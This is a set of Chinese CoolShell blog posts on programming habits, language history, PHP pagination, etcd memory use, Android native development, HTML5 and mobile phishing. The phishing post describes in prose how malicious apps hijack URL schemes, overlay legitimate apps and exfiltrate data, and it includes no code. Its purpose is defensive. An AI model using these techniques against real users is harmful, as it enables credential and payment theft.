人类的沟通是我们最主要的活动。成为一个好的沟通者是一件很难的事情，我们不断地和别人交换关于设计，编码，文章的意见，并且我们每天都在试图说服别人我们自己的设计和想法会更好，更有道理……然后，好的沟通者是那些当他们正在解释一些事情的时候，他们的解释是下面这个样子的：* **专注。** 不跑题，没有废话。   * **清晰**. 很容易听懂。   * **简明**. 加一点就觉得多，少一点都觉得不够。要有一个好的沟通技巧，我们的建议如下：* 如果你觉得你沟通方面不够好的话，请事先准备你要表达的东西，努力做到专注，清晰和简明。   * 在交谈中，先听，后想，最后再说。   * 永远从对方的角度思考问题。#### 4.- 忘了用户_“如果我们不关心我们的用户……那么别人会”_你的存在，你工作的意思只有一个原因——你的用户。我们在很多时间都会忘了这个事情。经常，我们在工作当中，技术会取代用户而占据了主要的位置，我们可以花费数月的时间来创建一个程序框架，但一个程序框架不会给用户代来任何的价值，我们不是说程序框架不重要，而是说，对于用户的需求来说，这是其次重要的东西。如果离开了用户的需求，我们所有的技术，算法或是精妙的设计将会变得什么也不是。
#### 5.- 不懂工作的轻重缓急程序员总是喜欢去研究一些新的或自己感兴趣的东西，但对于软件工程来说，我们更需要知道所有事情的轻重缓急，要学会如何了解事情的优先级，这样才会让我们的工作事半功倍，而我们的工作也会更有效。比如，当用户的站点出现问题的时候，有些时候，我们的程序员过试地关注于问题的重现和原因，而忘记了用户的站点正在流血，无法进行生产。所以，一般来说，最重要的事情首先是恢复用户站点，然后才是去重现和调查问题。在我们的日常工作中，我们要处理很多事情，只有了解到了所有事情的轻重缓急，处理最重要最紧急的事情，我们才能够更好的安排自己的工作，才能够更好的完成我们的事情。不要以为这是一件很简单的事情，这需要我们不断地和别人沟通来了解事情的轻重缓急，事实证明，如果我们不懂工作中的轻重缓急，本来只有一件紧急的事情，如果处理不当，最后可能会演变成多件紧急事情，其它本来不紧急的事，后来也会变得很紧急，最终程序员们顾此失彼，苦不堪言。希望大家切记。（全文完）# 编程语言进化作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前本站发布过《编程语言时间地理图》、《计算机编程简史图》，下面是两张关于编程语言的进化图。
第一张是比较宏观的，来源在这里，虽然是去年的，但还是比较不错的，其把计算机编程语言分成了五个时代——* **语言诞生** 。1940年代。第一个语言应该是：Ada Lovelace,   * **编译器时代** 。1950年代。这个时代的代表语言是：Fortran, LISP, 和 COBOL，编程语言开始引入编译器优化技术。   * **模式时代** 。1960年代-1970年代。这个时代是编程语言最重大的变革。在这个时代，所有人都在思考如何让设计一个好的编程语言以让编程更简单。面向对象也因为Simula而出现，而Smalltalk成了第一个纯动态类型的语言，C/C++、Pascal和SQL也是这个时代出现的，而第一个功能性/函数式语言ML也是这个时代出现的。所以说，这个时代是一个百花齐放的时代。而1980年代并没有太多的创新的东西，而只是对70年代出现的那些语言优化和发展的时期，如：1979年发明的C++语言。   * **生产力时代** 。1990年代以来主要是如何增进编程生产率的时代，这个时代出现了很多framework，代码库，以及快速开发的IDE，很多公司都在这个时期致力于这些增进生率的工作，如：delphi, power builder, MFC，boost等等。但最重要的还是因为引入了虚拟机——WORA（Write Once, Run Anywhere），JVM 是这方面的代表作。之后的.NET整出来的那些东西都是。今天的JPython, JRuby等都是为整合开发效率和维护效率。参看《基于JVM的语言正在开始流行》   * **后现代** 。未来的编程语言要走向何方，我不太清楚，不过，大家可以看看本站的这几篇文章：《五个编程语言设计的失误》、《C++和JAVA传统中积极的一面》
下面是一张大图，让你看看整个编程语言的进代图。（点击看大图）（全文完）# PHP分页技术的代码和示例作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文来自：10 Helpful PHP Pagination Scripts For Web Developers分页是目前在显示大量结果时所采用的最好的方式。有了下面这些代码的帮助，开发人员可以在多个页面中显示大量的数据。在互联网上，分​页是一般用于搜索结果或是浏览全部信息（比如：一个论坛主题）。几乎在每一个Web应用程序都需要划分返回的数据，并按页显示。下面的这个列表给出的代码可以让你的开发很有帮助。 **学习这些代码，对于初学者也很有帮助** 。目录* 1) 使用Ajax分页   * 2) MySql 分页   * 3) Facebook/Twitter 风格的分页   * 4) Php & MySql 分页   * 5) 分页风格   * 6) PHP 分页类   * 7) Easy Pagination   * 8 ) 基本分页   * 9) Php Page   * 10) perfect-php-pagination
#### 1) 使用Ajax分页下面这个示例使用了jQuery + PHP。 Demo link#### 2) MySql 分页数据库的分页处理。#### 3) Facebook/Twitter 风格的分页#### 4) Php & MySql 分页#### 5) 分页风格一个简单的教程教你如何用CSS定义不同风格的分页。#### 6) PHP 分页类一个PHP的分页类#### 7) Easy Pagination这是一个PHP库，可以让你更容易的做分页。#### 8 ) 基本分页一个很不错简单易懂的分页教程。#### 9) Php Page###一个简单的PHP的教程#### 10) perfect-php-pagination也是一个分页教程。（全文完）# ETCD的内存问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为什么要用etcd，使用etcd的用户场景，包括etcd的一些导致内存占用比较大的设计，以及最后一些建议。希望这篇文章不仅仅只是让你看到了一个简单的内存问题，还能让你有更多的收获。当然，也欢迎您关注我们的开源软件，给我们一些鼓励。
#### 为什么要用ETCD先说一下为什么要用etcd。先从一个我们自己做的一个API网关 – Easegress（源码）说起。Easegress 是我们开发并开源的一个API应用网关产品，这个API应用网关不仅仅只是像nginx那样用来做一个反向代理，这个网关可以做的事很多，比如：API编排、服务发现、弹力设计（熔断、限流、重试等）、认证鉴权（JWT，OAuth2，HMAC等）、同样支持各种Cloud Native的架构如：微服务架构，Service Mesh，Serverless/FaaS的集成，并可以用于扛高并发、灰度发布、全链路压力测试、物联网……等更为高级的企业级的解决方案。所以，为了达到这些目标，在2017年的时候，我们觉得在现有的网关如Nginx上是无法演进出来这样的软件的，必需重新写一个（后来其他人也应该跟我们的想法一样，所以，Lyft写了一个Envoy。只不过，Envoy是用C++写的，而我用了技术门槛更低的Go语言）另外，Easegress最核心的设计主要有三个：* 一是无第三方依赖的自己选主组集群的能力   * 二是像Linux管道命令行那样pipeline式的插件流式处理（支持Go/WebAssembly）   * 三是内置一个Data Store用于集群控制和数据共享。
对于任何一个分布式系统，都需要有一个强一制性的基于Paxos/Raft的可以自动选主机制，并且需要在整个集群间同步一些关键的控制/配置和相关的共享数据，以保证整个集群的行为是统一一致的。如果没有这么一个东西的话，就没有办法玩分布式系统的。这就是为什么会有像Zookeeper/etcd这样的组件出现并流行的原因。注意，Zookeeper他们主要不是给你存数据的，而是给你组集群的。Zookeeper是一个很流行的开源软件，也被用于各大公司的生产线，包括一些开源软件，比如：Kafka。但是，这会让其它软件有一个依赖，并且在运维上带来很大的复杂度。所以，Kafka在最新的版本也通过内置了选主的算法，而抛弃了外挂zookeeper的设计。Etcd是Go语言社区这边的主力，也是kubernetes组建集群的关键组件。Easegress在一开始（5年前）使用了gossip协议同步状态（当时想的过于超前，想做广域网的集群），但是后发现这个协议太过于复杂，而且很难调试，而广域网的API Gateway也没遇到相应的场景。所以，在3年前的时候，为了稳定性的考量，我们把其换成了内嵌版本的etcd，这个设计一直沿用到今天。
Easegress会把所有的配置信息都放到etcd里，还包括一些统计监控数据，以及一些用户的自定义数据（这样用户自己的plugin不但可以在一条pipeline内，还可以在整个集群内共享数据），这对于用户进行扩展来说是非常方便的。软件代码的扩展性一直是我们追求的首要目标，尤其是开源软件更要想方设法降低技术门槛让技术易扩展，这就是为什么Google的很多开源软件都会选使用Go语言的原因，也是为什么Go正在取代C/C++的做PaaS基础组件的原因。#### 背景问题好了，在介绍完为什么要用etcd以后，我开始分享一个实际的问题了。我们有个用户在使用 Easegress 的时候，在Easegress内配置了上千条pipeline，导致 Easegress的内存飙升的非常厉害- 10+GB 以上，而且长时间还下不来。用户报告的问题是——> 在Easegress 1.4.1 > 上创建一个HTTP对象，1000个Pipeline，在Easegres初始化启动完成时的内存占用大概为400M，运行80分钟后2GB，运行200分钟后达到了4GB，这期间什么也没有干，对Easegress没有进行过一次请求。
一般来说，就算是API再多也不应该配置这么多的处理管道pipeline的，通常我们会使用HTTP API的前缀把一组属于一个类别的API配置在一个管道内是比较合理的，就像nginx下的location的配置，一般来说不会太多的。但是，在用户的这个场景下配置了上千个pipeline，我们也是头一次见，应该是用户想做更细粒度的控制。经过调查后，我们发现内存使用基本全部来自etcd，我们实在没有想到，因为我们往etcd里放的数据也没有多少个key，感觉不会超过10M，但不知道为什么会占用了10GB的内存。这种时候，一般会怀疑etcd有内存泄漏，上etcd上的github上搜了一下，发现etcd在3.2和3.3的版本上都有内存泄露的问题，但都修改了，而 Easegress 使用的是3.5的最新版本，另外，一般来说内存泄漏的问题不会是这么大的，我们开始怀疑是我们哪里误用了etcd。要知道是否误用了etcd，那么只有一条路了，沉下心来，把etcd的设计好好地看一遍。大概花了两天左右的时间看了一下etcd的设计，我发现了etcd有下面这些消耗内存的设计，老实说，还是非常昂贵的，这里分享出来，避免后面的同学再次掉坑。
**首当其冲是——RaftLog** 。etcd用Raft Log，主要是用于帮助follower同步数据，这个log的底层实现不是文件，而是内存。所以，而且还至少要保留 `5000` 条最新的请求。如果key的size很大，这 `5000`条就会产生大量的内存开销。比如，不断更新一个 1M的key，哪怕是同一个key，这 5000 条Log就是 5000MB = 5GB 的内存开销。这个问题在etcd的issue列表中也有人提到过 issue #12548 ，不过，这个问题不了了之了。这个5000还是一个hardcode，无法改。（参看 `DefaultSnapshotCatchUpEntries` 相关源码）// DefaultSnapshotCatchUpEntries is the number of entries for a slow follower     // to catch-up after compacting the raft storage entries.     // We expect the follower has a millisecond level latency with the leader.     // The max throughput is around 10K. Keep a 5K entries is enough for helping     // follower to catch up.     DefaultSnapshotCatchUpEntries uint64 = 5000
另外，我们还发现，这个设计在历史上etcd的官方团队把这个默认值从10000降到了5000，我们估计etcd官方团队也意识到10000有点太耗内存了，所以，降了一半，但是又怕follwer同步不上，所以，保留了 5000条……（在这里，我个人感觉还有更好的方法，至少不用全放在内存里吧……）另外还有下面几项也会导致etcd的内存会增加1. **索引** 。etcd的每一对 key-value 都会在内存中有一个 B-tree 索引。这个索引的开销跟key的长度有关，etcd还会保存版本。所以B-tree的内存跟key的长度以及历史版本号数量也有关系。   2. **mmap** 。还有，etcd 使用 mmap 这样上古的unix技术做文件映射，会把他的blotdb的内存map到虚拟内存中，所以，db-size越大，内存越大。   3. **Watcher** 。watch也会占用很大的内存，如果watch很多，连接数多，都会堆积内存。（很明显，etcd这么做就是为了一个高性能的考虑）Easegress中的问题更多的应该是Raft Log 的问题。后面三种问题我们觉得不会是用户这个问题的原因，对于索引和mmap，使用 etcd 的 compact 和 defreg （压缩和碎片整理应该可以降低内存，但用户那边不应该是这个问题的核心原因）。
针对用户的问题，大约有1000多条pipeline，因为Easegress会对每一条pipeline进行数据统计（如：M1, M5, M15， P99, P90, P50等这样的统计数据），统计信息可能会有1KB-2KB左右，但Easegress会把这1000条pipeline的统计数据合并起来写到一个key中，这1000多条的统计数据合并后会导致出现一个平均尺寸为2MB的key，而5000个in- memory的RaftLog导致etcd要消耗了10GB的内存。之前没有这么多的pipeline的场景，所以，这个内存问题没有暴露出来。于是，我们最终的解决方案也很简单，我们修改我们的策略，不再写这么大的Value的数据了，虽然以前只写在一个key上，但是Key的值太大，现在把这个大Key值拆分成多个小的key来写，这样，实际保存的数据没有发生变化，但是RaftLog的每条数据量就小了，所以，以前是5000条 2M（10GB），现在是5000条 1K（500MB），就这样解决了这个问题。相关的PR在这里 PR#542 。#### 总结要用好 etcd，有如下的实践* 避免大尺寸的key和value，一方面会通过一个内存级的 Raft Log 占大量内存，另一方面，B-tree的多版本索引也会因为这样耗内存。   * 避免DB的尺寸太大，并通过 compact和defreg来压缩和碎片整理降低内存。   * 避免大量的Watch Client 和 Watch数。这个开销也是比较大的。   * 最后还有一个，就是尽可能使用新的版本，无论是go语言还是etcd，这样会少很多内存问题。比如：golang的这个跟LInux内核心相关的内存问题 —— golang 1.12的版sget的是 `MADV_FREE` 的内存回收机制，而在1.16的时候，改成了 `MADV_DONTNEED` ，这两者的差别是，`FREE`表示，虽然进程标记内存不要了，但是操作系统会保留之，直到需要更多的内存，而 `DONTNEED` 则是立马回收，你可以看到，在常驻内存RSS 上，前者虽然在golang的进程上回收了内存，但是RSS值不变，而后者会看到RSS直立马变化。Linux下对 `MADV_FREE` 的实现在某些情况下有一定的问题，所以，在go 1.16的时候，默认值改成了 `MADV_DONTNEED` 。而 etcd 3.4 是用 来1.12 编译的。
最后，欢迎大家关注我们的开源软件！ https://github.com/megaease/（全文完）# Android将允许纯C/C++开发应用作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn对于Android，长期以来，我一直有两件事搞不懂，* 一个是为什么Android要选用Java。对于嵌入式开发，CPU和内存都很宝贵，居然还使用Java。   * 一个是为什么Android的开发站点要被墙。这只是一个技术网站啊。最近，在一个Android开发人员的Blog上证实了在NDK r5使用C/C++进行开发。（以前，Android 对C/C++开发的支持仅限于用C/C++开发动态链接库，然后在Java中以JNI的形式来调用）现在，你可以用纯C/C++开发了（参看下面的程序代码）。还有一段完整的代码示例在这里（墙，还有XML的manifest，又见XML）。看来，Google终于明白为什么使用Android的手机（如：Moto, 三星、索爱和HTC）的触摸体验远远不及object C搞出来的iPhone。我个人估计有两个原因为什么Google回头支持C/C++了，
1. Google开始觉得自己整的JVM在性能上可以全面超越传统JVM，并接近C/C++，现在发现搞不定了。   2. Google发现Java的程序员不像C/C++程序员那样注重程序的性能和效率，开发App太耗CPU和内存。于是只好转回支持C/C++。 **本来就是用C/C++写出来的Android嘛，居然不能用C/C++而只能用Java，真是太侮辱C/C++了** 。最后，只希望Google并不是又整了一个C/C++版的Dalvik虚拟机，不然就真是侮辱到极点了。_——— 更新 2011/01/24 ————_谢谢大家对这篇文章的评论，挺有意思的，欢迎讨论，我把我的回复更新在下面。不一定对，仅供大家参考。Java的学习成本低，开放性好，兼容性也高，我不否认（但请大家也别否认C/C++的效率要比Java要高。而C/C++的程序员在普遍上要比Java程序员更注意性能和效率）。这应该是Andorid的一开始的定位，可见，Google关注的是程序员，而不是用户。现在转回支持C/C++必然有他的原因，如果不是性能上的原因。那么就请大家分析一下别的原因。Android本来就是用C/C++写的，要跨平台，首先是Android自己跨平台。就像Linux一样，跨平台的首先是Linux，应用开发人员只需要符合Linux的API就OK了。JVM带来的便利只是无需重新编译（就算是无需重新编译，对于开发人员来说也要去那个平台做测试的，因为不同的平台的JVM同样是不一样的）。在Native平台上编译的成本其实并不高，这个编译过程完全可以在部署的时候自动化。
有人说，Java的开发成本比C/C++低，但这和语言没有关系，这其实和封装程度有关系。C/C++同样可以封装得很好。而且，C/C++的程序员比JAVA程序来说，天生就对内存和性能要敏感的多。这更有利于在手机这样资源不足的平台上做开发。尤其对于像手机这样的时尚终端来说，在用户体验上花的成本要比在开发人员上花成本要大得多的多。我以为，Google 的Android 更多的关注了程序员，而不是用户。而iPhone更多的关注了用户，也让程序员在开发过程上受到了一些牺牲（iPhone的做法是如果程序员的程序要上App Store，先交99美刀的代码审查费，就像申请美国签证一样），但是，iPhone的程序员虽然在开发的方便上有一些牺牲，但是从收入上却得到了保障。最新的消息是苹果已向开发者支付20亿美元 音乐供应商分成达120亿美元。在《偷了世界的程序员》中对此有充分的论述。最后，请大家思考 几个问题——* Android支持C/C++是为什么？如果是为了程序效率，那么这又是为什么？   * 是开发人员更重要，还是用户更重要？（注意：我说的是“更重要”）   * 在当今这种诸如iPhone或Andorid的开发模式下，是完全开放好，还是有适当的封闭好？   * 开发和封闭的背后的商业驱动是什么？如何在开放和封闭中权衡用户、开发者、公司和版权商的利益？
苹果公司给出了一个很不错的商业模式。（完）# 你准备使用 HTML 5 吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn现在做Web上的效果，主要是有三种方法，Flash，Javascript 和 HTML5。Flash就不用多说了，Javascript的效果也越来越猛了，如果配上HTML5，那就如虎添翼了。先看看下面的这个HTML5的演示。其使用了HTML5的Canvas元件，把鼠标移上去看看吧（最好在Chrome下浏览）。源链接在这里（在这里展示有点小，还是在那边全屏的看好一点）下面是一个大图，来自这里（点击看大图）。其“抱怨”了为什么HTML怎么都要管？呵呵。其分成三块：* 第一块是关于HTML5的功能，你可以查看本站的这篇文章以查看相关的HTML5的细节。   * 第二块说明了各种浏览器对HTML5的支持，从图中我们可以看到Chrome是支持的最好的。   * 第三块从价格，功能，应用和效率上比较了HTML5和Flash，可参看本站的《HTML5 和 Flash 之争》。为什么HTML什么都要干？（点击看大图）比较方面，关于价格，虽然Flash Player是免费的，但是开发工具是收费的，最重要的是，HTML5不是公司的产品，不存在垄断。在功能方面，目前当然是Flash很强，因为其图形处理能力很强，这点HTML5不如。在通用性方面，Flash是以插件的方式，而HTML5是浏览器支持的。当然，在性能方面，Javascript的方式对于CPU消耗地太猛了，这点Flash优势就很大了。
HTML5还是Flash，你觉得哪个会更好呢？# 关于移动端的钓鱼式攻击作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!phishing-1今天，在微博上看了一篇《微信和淘宝到底是谁封谁》的文章，我觉得文章中逻辑错乱，所以，我发了一篇关于这篇文章逻辑问题的长微博。后面，我被原博主冷嘲热讽了一番，说是什么鸡汤啊，什么我与某某之流的人在一起混淆视听啊，等等。并且也有一些网友找我讨论一下相关的钓鱼式攻击的技术问题。所以，我想写下这篇纯技术文章，因为我对那些商业利益上的东西不关心，所以，只谈技术，这样最简单。首先说明一下， **我个人不是一个安全专家，也不是一个移动开发专家，按道理来说，这篇文章不应该我来写，但是我就试一试，请原谅我的无知，也期待抛砖引玉了，希望安全的同学斧正** 。关于钓鱼式攻击，其实是通过一种社会工程学的方式来愚弄用户的攻击式，攻击者通常会模仿一个用户信任的网站来偷取用户的机密信息，比如用户密码或是信用卡。一般来说，攻击者会通过邮件和实时通信工具完成，给被攻击者发送一个高仿的网站，然后让用户看不出来与正统网站的差别，然后收集用户的机密数据。
目录* 移动端钓鱼攻击点分析   * 攻击方式     * 从一个应用唤起另一个应用的方式     * 在一个应用内内嵌Web的方式   * 怎么防范钓鱼式攻击   * 关于微信和淘宝#### 移动端钓鱼攻击点分析因为钓鱼式攻击并不新鲜，所以我这里只讲移动方面的。在移动端，这个事情会更容易干，因为移动端有如下特点：* 移动端的UI只能有一个应用占据整个屏幕，你只能看到一个应用，而且用户屏幕小，能显示的信息有限，比如浏览器里的网址是显示不全的。这会给钓鱼攻击有很多可乘之机。* 移动端的平台有其安全的设计。每个应用都是隔离开的，一个应用无法获取另一个应用的数据。而且应用的下载基本上来说都是来自合法的地方。比如iOS的设备通过App Store下载，每个程序都有自己的签名保证不会被篡改。而且移动端的的应用有各种权限配置，这样也能很大程度提高安全性。* 移动端的APP有些有些是收费的，所以自然会有盗版需求，虽然在平台上做了一些安全设计，但是并不完美。用户可以越狱，可以root。这给恶意软件有了可乘之机。下面我们来分析下移动端的用户操作，我们重点关注用户控制权的切换过程（因为这是攻击点）在移动设备上，基本上来说，用户的控制切换有四种：
* 从一个APP切到另一个APP，也就是我们所谓的唤出APP。   * 从一个APP唤出一个Web，常见为一个嵌入式的WebView或是一个浏览器   * 从一个Web唤出一个APP，这需要浏览器支持一些非标准的HTTP协议，比如skype://之类的。   * 从一个Web到另一个Web，这和Web上的方式差不多。基本上来说， **黑客的攻击从来都是找这样的转换环节来做文章的，并且需要一个用户非常熟悉的场景（这样用户才会放松警惕）** 。通过观察移动APP的特性，我们可以知道，当用户控制切换时，有下面的这些特性：* 到另一个APP时，需要用户登录（如果登录的session过期了）   * 当支付的时候，需要用户输入支付信息（信用卡信息、支持密码）那么用户在移动APP上经常做的事是什么？* **社交分享** ：分享到微博，分享到微信等等，分享的时候，可能需要你输入用户名和口令。* **应用内购** ：一般来说APP会有两种，一种免费的，一种是收费的，大量的用户都是下载免费的，然后通过什么“开通更多关卡”、“去广告”、“买道具”之类的东西，让用户输入支付信息。Apple的支付的时候也会要用户输入Apple ID的密码。
* **点击链接** ：有时候，我们收到短信，或是二维码，或是一个微信微博，会让我们去点击一个网站链接，这个网站链接要么就是打开一个网页，要么就是启动应用，要么就是跳转到应用市场去下载应用（如果你没安装）。所以，一个好的钓鱼式攻击一定会从这些地方入手，然后高仿UI以及交互流程，这个交互流程和用户日常操作的完全一样，让用户无法察觉。任何方式的钓鱼攻击简单来说，会有两种：* **一种是直接攻击：** 你下载了一个恶意的APP，或是打开了一个恶意的冒牌APP。   * **一种是中间人攻击：** 用户控制权转换时的两端都是正规应用，但是中间的过程不是正常的。#### 攻击方式下面是一些常见的攻击方式：##### 从一个应用唤起另一个应用的方式**直接攻击**当你点击一个社交分享按钮，或是一个支付按钮的时候。就会转到一个页面，这个页面需要你输入用户机密信息（密码或是支付信息），然后再唤起真正的APP。一个有恶意的APP可能会让你放松警惕，因为，这个你在安装这个APP的时候，你会发现这个APP根本不需要任何的权限（Android上的），甚至连网络访问的权限都不要，因为在Android下，App可以通过别的组件访问互联网，比如：恶意应用可能创建一个MediaPlayer Object，然后就可以通过这个对象访问一个URL然后把偷到的信息发送出去。
你的手机要被安装一个恶意的应用并不难，同样通过社工的方式，比如：盗版，色情，伪装成客服等等通过人性的弱点让你去一些非受信的市场上安装。iOS设备上的应用也可以不用通过App Store安装（通过itms-services协议，可以通过safari浏览器直接在IOS设备上安装应用程序）。还有，人们都是贪小便宜的人，所以，会到某些地方买一些便宜的手机（比如淘宝），现在的高仿手机，翻新的二手手机对于一般人甚至安全专家来说完全没有识别能力。这些手机中有很大可能藏有恶意程序。你千万不要以为你格式化手机就OK了。今天（2015年4月14日）早上CCTV2台的“第一时间”就说了一个案例，你可以看看。另外，你可以看看相关的新闻。（另外，你把你的旧手机卖了也要小心，因为你的数据就在里面，旧手机已经成了一个灰色产业链）另外，Apple的App需要有一个review过程，这个过程对大众是神秘的，但我觉得应该会包括安全方面的review。不过，这个审核过程可能也有空子可以钻。比如：在review的时候，这个应用完全正常，但在用户使用的时候，会自己从网站下载一些自己的配置文件而改变行为（更为直接的就是访问外部网页时在审核时和在用户应用时可能完全不一样，Apple应该完全没有能力审核应用要访问的外部站点）
**中间人攻击**我们知道，一个APP唤起另一个APP好多都是用url- scheme的，也就是某种协议，审核这样的协议非常简单，所以如果有恶意的东西在里面基本上很容易看到。但是，如果某些APP并没有注册自己的url- scheme，或是没有被安装，反而，另一个有恶意的APP注册了这个scheme，那么，就会导致恶意的APP被唤起来了（ **这就是我为什么在我的微博中说，如果用户没有安装淘宝的客户端，那么，让微信唤起淘宝的客户端时，有可能是另一个有恶意的APP。但是很多人不懂这个事。 在iOS下，两个APP通讯正确的做法是“钥匙串机制”**）。当然如果有两个应用被注册了同一个scheme，那么，iOS和Android会给出一个选择，让用户来选（注：iOS的系统有可能会直接跳某个 App 上去，不同版本的跳规则不明确，可以认为是随机跳转）。于是乎，恶意的APP就要努力的让自己比正规的APP看起来更像个正规的APP就可以了。在Android平台上，这个事可能更变态，只要恶意的应用有两个权限，一个是随手机操作系统在后台启动，一个是task list（然而这两个权限都是一般权限）。这样一来，当你进行两个APP切换时，恶意程序可以通过task list权限监控到，然后自己马上先于正规的app出现，等到收集完用户数据后简单的退出就好了。这个方式只需要你的程序能在10ms以内反应过来（最佳是5ms左右），人的肉眼根本看不出来。（在iOS设备下，除了jail break后的iPhone可以这么干，正常的都iPhone还没有找到这样的攻击方式）
##### 在一个应用内内嵌Web的方式这种方式更容易攻击了，现在很多很多应用都是内嵌的Web的形式，你完全不知道打开的网页的网站是什么，因为这些内嵌的WebView你连地址都看不见。而且无论是iOS或Android，其WebView都可以执行任何的Javascript代码，就算显示URL，URL也可能是被混乱过的，你也看不全，你也很容易上当。当然，那些使用带SSL证书的支持HTTPS的网站（尤其是EV证书）可以在地址栏上显示一个绿色的标记表示你访问的就是正确网址，但是并不是所有的浏览器都会这样，比如iPhone的Safari并没有这个提示，所以，你一定要用Chrome。更狠的是就算你打开的是一个正确的URL，你依然可能被中间人攻击。尤其是这个网站使用了明文的HTTP协议，而你又喜欢蹭那些免费的WiFi，于是很容易给把服务器返回给你的网页中做修改，比如，修改网页中login表单或是支付表单提交的网站（想想天朝的网络运营商给你访问的正常的网页弹广告这事吧）关于DNS劫持，有些人觉得这事可能遇不上，因为这是一个全网的问题，如果你有这样的想法你就错了。还是那样，你爱占便宜，蹭上那些没有密码的WiFi，你完不知道，你连上去的那个WiFi会设置什么样的DNS服务器，你输入了www.taobao.com，但你打开的网站根本就是不是淘定，而是一个钓鱼网站。你会知道你打开的是错的了么？基本不可能。所以，安全点的网站都是要用HTTPS，但是还是那句话，iPhone的Safari并不会提示你打开网站的SSL证书合不合法（事实上，在手机上的很多浏览器都不会这提示，只有Chrome会）。
关于攻击的方式我不想讲太多，还有很多高级+猥琐的方式我也不是完全知道，知道了我也不说，不然，教人犯罪了。关于从Web端唤起APP是和，APP唤醒APP的攻击方式基本一样。我就不说了。#### 怎么防范钓鱼式攻击首先，我们要知道，钓鱼式攻击是一件非常难搞的事。要搞定这个事，一般来说需要四个方面： **立法层面** 、 **用户培训层面** 、 **宣传层面** 、与 **技术保全措施层面** 。**教育方面**打击网钓的策略之一，是试着培养人们识别网钓，并教导怎样处理这些问题。只需要稍稍修改人们浏览习惯的方式，很多问题都可以避免。随着人们越来越认识到网钓者所使用的社会工程学技俩，传统的网钓欺诈技术可能在未来过时。* 对别人发来的链接要小心，尤其是让你输入机密信息的链接要小心检查。* 到正规的地方买手机，不要贪图小便宜。旧手机在卖前要“物理删除”数据。* 不要对手机越狱，不要root。* 不要从非信任的地方下载软件。* 要小心免费的WiFi。* 输入机密数据的时候一定要小心检查。* 多依赖一些不同的安全体系，比如：网上支付不要只依赖支付宝，尽量使用信用卡（信用卡千万不要设密码），这样就算是被钓鱼了，你还有一个银行安全的缓冲地带——可以不承认交易。
* 现在使用手机的频率越来越高，所以，我非常建议你使用更为安全的iPhone手机，一定要打开“查找我的iPhone”功能，然后设上开机密码。iPhone手机可以做到手机丢失了别人都无法使用，包括刷机都刷不了（iOS7以上版本）* 对于一些关键网站，开启两步验证，这样就算你的用户名和密码被钓走了，还有一个动态手机口令做为登录的关卡。**技术方面*** 利用SSL证书来保证从浏览器到网站的访问是现在采用比较多的方式，也是在理论上可行的方式。现代的浏览器都会在URL上放上一个锁的标志，对于EV证书，你会看到浏览器的URL是绿色的（很容易分辨）* 另外，像firefox浏览器有一个petname的插件，你可以为你常上的网站设置一些标签。这样，当你打开钓鱼网站的时候，你会发现这些标签没有显示出来，那就有问题了。* 关于SSL的CA认证机构，你需要管理好你浏览的那些根证书，有些根证书你需要删掉。* 还有一种打击网钓的流行作法是保持一份已知的网钓网站名单，并随时更新。比如PhishTank，以及中国防钓鱼网站联盟。* 增加式登录方式。这种方式被美国银行采用，就是说，你可以上传一个你自己知道的图片，而当你打开登录页面里时，输入了自己的用户名后，你会看到你设置的这个图片被显示出来。如果没有或是显示错了，表示你打开的是钓鱼网站。
* 两步验证，通过用户自设密码+手机动态口令登录（好些网站都在使用Google Authenticator的方式，这有点像公司VPN的动态口令）。上述都是PC Web上的防范，然而我们的手机移动端做的并不够好，移动端的安全还是要加油。**安全风控方面****什么叫安全风控，说白了就是拿钱出来赔偿给被骗的用户，大家相信我，这个事情在基本上所有的公司都会做的** ，也就是说，无论你怎么做安全也无法保证绝对的安全，你只能缓解或是降低用户被骗的数量或概率。所以，几乎所有的公司都会有一笔钱专门用来赔偿。在西方国家，用户体验很好，我说一个故事，我有一个妹妹在英国，有一天她到ATM上取钱，取完钱后忘了把卡取出，结果后面的人把她的卡里的钱取走了，于是她报了警，等警察做完笔录后，她给银行的客服打了个电话说明了情况，本想冻结银行卡的，但是银行方面二话不说就赔偿了她所有的损失。为什么英国的巴克莱银行这么痛快，是因为他们有风控基金，专门用来处理这样的事的。在中国，其实银行和一些大的公司都有这笔安全风控基金，但是，要你非常坚持不懈地申诉，他们才会赔给你，而且还不是全部。要全部的话，我估计你要做一个“刁民”，否则欺负你，没道理。
#### 关于微信和淘宝微信和淘宝到底是谁先屏蔽谁我并不关心，这里面的商业利益我也不关心，微信是不是支持卖东西我也不关心。我关心的是寒冬文章中所说的微信上有淘宝钓鱼的安全问题。从技术上来说，我觉得要微信和淘宝一起干这事，单方都不行，需要两边的安全专家一起讨论（如果需要，我可以帮你们约）。我这里给一个可能很不成熟的方案，算是抛砖引玉（我不考虑你们之间的商业竞争，我只从用户的角度出发，客户第一）：> > **我觉得，从业务上来说，淘宝可以在微信上有一个官方的商城。而淘宝的商家，需要取得微信的认证后入住，才能分享相关的商品或店家链接，对此，商家入住，我觉得可通过微信的服务账号与淘宝的商家后台集成可以做到。** > > > **然后，商家也好，买家也好，他们分享商品只能通过微信官方的商城或是商家的服务账号分享出去，而分享出去的商品信息可以是一个比较unique的形式（比如有一个不能伪造的官方认证的标签），而用户的支付可以通过内置的微信支付也可以通过内置的支付宝（通过唤起App并不是一个好的方式，还是应该你们在服务端进行相互的通信）。** > > **然后微信和淘宝双方通过宣传手段告诉全社会，微信里的商品什么才是正规的，才不是钓鱼的，并给教育用户更为安全地使用手机。**
